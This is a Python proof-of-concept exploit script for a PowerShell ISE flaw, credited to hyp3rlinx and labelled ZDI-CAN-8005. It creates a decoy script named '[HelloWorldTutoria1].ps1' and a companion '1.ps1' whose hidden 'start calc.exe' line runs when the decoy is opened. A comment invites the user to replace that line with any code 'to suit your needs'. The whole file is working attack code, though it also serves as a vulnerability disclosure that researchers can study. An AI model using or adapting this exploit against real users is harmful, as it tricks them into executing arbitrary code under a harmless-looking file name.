#PowerShell ISE 0day Xploit
#ZDI-CAN-8005
#ZDI CVSS: 7.0
#hyp3rlinx
#ApparitionSec


fname1="[HelloWorldTutoria1].ps1"    #Expected code to run is 'HelloWorld!'
fname2="1.ps1"                       #Actual code executed is calc.exe for Poc
evil_code="start calc.exe"           #Edit to suit your needs.
c=0
payload1='Write-Output "Hello World!"'
payload2=evil_code+"\n"+'Write-Output "Hello World!"'

def mk_ps_hijack_script():
    global c
    c+=1
    f=open(globals()["fname"+str(c)],"wb")
    f.write(globals()["payload"+str(c)])
    f.close()
    if c<2:
        mk_ps_hijack_script()
        

if __name__=="__main__":
    mk_ps_hijack_script()
    print "PowerShell ISE Xploit 0day Files Created!"
    print "Discovery by hyp3rlinx"
    print "ZDI-CAN-8005"
